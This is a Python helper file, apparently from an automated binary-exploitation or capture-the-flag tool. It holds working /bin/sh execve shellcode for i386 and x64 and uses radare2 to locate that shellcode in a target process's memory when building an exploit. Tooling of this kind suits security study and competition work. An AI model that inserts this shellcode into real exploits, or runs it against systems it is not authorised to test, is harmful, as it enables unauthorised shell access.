from pwn import *
import r2pipe
import json

def getShellcode(properties):
    context.arch = properties['protections']['arch']

    if context.arch == 'i386': #/bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    elif context.arch == 'x64': #/bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56" + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    else:
        assembly = shellcraft.sh() #This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode

def getRegValues(filename,endAddr):

    r2 = r2pipe.open(filename)
    r2.cmd('doo')
    r2.cmd('dcu {}'.format(endAddr))
    regs = json.loads(r2.cmd('drj'))
    r2.quit()
    return regs

'''
This is so hacky. I'm sorry
It's also only for stdin
'''
def findShellcode(filename,endAddr,shellcode,commandInput):

    hex_str = shellcode[:4].hex()

    abs_path = os.path.abspath(filename)


    #If you know a better way to direct stdin please let me know
    os.system('env > temp.env')
    with open('/tmp/command.input','wb') as f:
        f.write(commandInput)
        f.close()
    with open('temp.rr2','w') as f:
        f.write("program={}\nstdin=/tmp/command.input\nenvfile={}\n".format(filename,"temp.env"))
#        f.write("program={}\nstdin=command.input\nclearenv=true\nenvfile={}\n".format(abs_path,"temp.env"))


    r2 = r2pipe.open(filename)
    r2.cmd('e dbg.profile = temp.rr2')
    r2.cmd('ood')
    r2.cmd('dcu {}'.format(endAddr)) ### breakpoint continue until
    r2.cmd('s ebp')
    r2.cmd('e search.maxhits =1')
    r2.cmd('e search.in=dbg.map')   #Need to specify this for r2pipe
    loc = json.loads(r2.cmd('/xj {}'.format(hex_str))) ### Search hex/string pattern in memory ranges
    # print(hex_str)
    print(loc)
    # input("@")

    #Cleaning up
    if os.path.exists('/tmp/command.input'):
        os.remove('/tmp/command.input')
    if os.path.exists('temp.rr2'):
        os.remove('temp.rr2')
    if os.path.exists('temp.env'):
        os.remove('temp.env')


    return loc